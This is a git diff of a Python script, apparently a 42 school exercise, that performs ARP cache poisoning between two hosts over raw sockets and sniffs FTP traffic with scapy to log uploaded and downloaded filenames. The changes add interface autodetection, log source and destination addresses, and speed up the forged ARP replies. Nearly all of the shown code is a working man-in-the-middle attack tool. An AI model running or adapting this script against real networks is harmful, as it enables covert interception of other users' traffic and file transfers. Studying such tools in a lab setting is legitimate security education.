@@ -6,7 +6,7 @@
 #    By: hubourge <hubourge@student.42angouleme.    +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2025/06/23 15:42:16 by hubourge          #+#    #+#              #
-#    Updated: 2025/06/23 18:21:00 by hubourge         ###   ########.fr        #
+#    Updated: 2025/06/24 16:53:56 by hubourge         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -16,12 +16,27 @@ import sys
 import time
 import signal
 import threading
-from scapy.all import sniff, TCP, Raw
+import netifaces
+from scapy.all import sniff, IP, TCP, Raw
 
 ETHERNET_HEADER_FORMAT = "!6s6sH"       # Big Endian (!) Dest MAC (6s), Src MAC (6s), Type ARP (H)
 ARP_HEADER_FORMAT = "!HHBBH6s4s6s4s"    # ARP struct
 poisoning = True
-interface = "enp0s3"
+interface = None
+count = 0
+
+def getInterface(target_ip=None):
+    for iface in netifaces.interfaces():
+        addrs = netifaces.ifaddresses(iface)
+        if netifaces.AF_INET in addrs:
+            for addr in addrs[netifaces.AF_INET]:
+                ip = addr.get('addr')
+                if target_ip:
+                    if ip == target_ip:
+                        return iface
+                elif ip != "127.0.0.1":
+                    return iface
+    return None
 
 def parsing():
     if len(sys.argv) != 5:
@@ -74,7 +89,7 @@ def restore_arp(sock, src_mac, src_ip, dest_mac, dest_ip):
 
 def handle_sigint(sig, frame):
         poisoning = False
-        print(f"\n  Restore ARP table at {ip_target}")
+        print(f"\n\n  Restore ARP table at {ip_target}")
         restore_arp(sock, mac_src, ip_src, mac_target, ip_target)
         print(f"  Restore ARP table at {ip_src}")
         restore_arp(sock, mac_target, ip_target, mac_src, ip_src)
@@ -85,20 +100,19 @@ def ftp_packet_callback(packet):
         payload = packet[Raw].load.decode(errors="ignore")
         if payload.startswith("STOR") or payload.startswith("RETR"):
             filename = payload.strip().split(" ")[1]
-            direction = "Upload (STOR)" if payload.startswith("STOR") else "Download (RETR)"
-            print(f"  [FTP] {direction} -> {filename}")
+            
+            if payload.startswith("STOR"):
+                direction = "Upload (STOR)"
+            else:
+                direction = "Download (RETR)"
 
-    # if packet.haslayer(TCP) and packet.haslayer(Raw):
-    #     payload = packet[Raw].load.decode(errors="ignore")
-    #     if "STOR" in payload or "RETR" in payload:
-    #         lines = payload.strip().split("\r\n")
-    #         for line in lines:
-    #             if line.startswith("STOR") or line.startswith("RETR"):
-    #                 parts = line.split()
-    #                 if len(parts) >= 2:
-    #                     filename = parts[1]
-    #                     direction = "Upload (STOR)" if line.startswith("STOR") else "Download (RETR)"
-    #                     print(f"[FTP] {direction} -> {filename}")
+            tmp_ip_src = packet[IP].src
+            tmp_ip_dst = packet[IP].dst
+            tmp_port_src = packet[TCP].sport
+            tmp_port_dst = packet[TCP].dport
+
+            print(f"\n  [FTP] {direction} -> {filename}")
+            print(f"        From {tmp_ip_src}:{tmp_port_src} To {tmp_ip_dst}:{tmp_port_dst}")
 
 def sniff_ftp_traffic():
     print("\n  Sniffing FTP traffic...")
@@ -111,12 +125,20 @@ def resolve_hostname(hostname_or_ip):
         return hostname_or_ip
 
 def main():
-    global ip_src, mac_src, ip_target, mac_target
+    global ip_src, mac_src, ip_target, mac_target, count
     ip_src, mac_src, ip_target, mac_target = parsing()
     ip_src_str = resolve_hostname(ip_src)
     ip_target_str = resolve_hostname(ip_target)
 
-    global poisoning, sock, interface
+    global interface
+    interface = "lo"
+    # interface = getInterface(ip_src) or getInterface(ip_target)
+    if not interface:
+        print("No network interface found.")
+        sys.exit(1)
+    print(f"  Using interface: {interface}")
+
+    global poisoning, sock
     sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
     sock.bind((interface, 0))
 
@@ -134,13 +156,15 @@ def main():
 
     print("\n  Starting ARP poisoning...")
     while poisoning:
-        print(f"  [ARP REPLY] to {ip_src_str} : {ip_target_str} is-at {mac_target}")
+        print(f"\r  [ARP REPLY] {count} - {ip_src_str} : {ip_target_str} is-at {mac_target} | {ip_target_str} : {ip_src_str} is-at {mac_src}", end='', flush=True)
+        # print(f"  [ARP REPLY] to {ip_src_str} : {ip_target_str} is-at {mac_target} x{count}")
         pckt1 = build_arp_packet(mac_target, ip_target, mac_src, ip_src, mac_src, ip_src)
-        print(f"  [ARP REPLY] to {ip_target_str} : {ip_src_str} is-at {mac_src}")
+        # print(f"  [ARP REPLY] to {ip_target_str} : {ip_src_str} is-at {mac_src} x{count}")
+        count += 1
         pckt2 = build_arp_packet(mac_src, ip_src, mac_target, ip_target, mac_target, ip_target)
         sock.send(pckt1)
         sock.send(pckt2)
-        time.sleep(2)
+        time.sleep(0.2)
 
 if __name__ == "__main__":
     main()
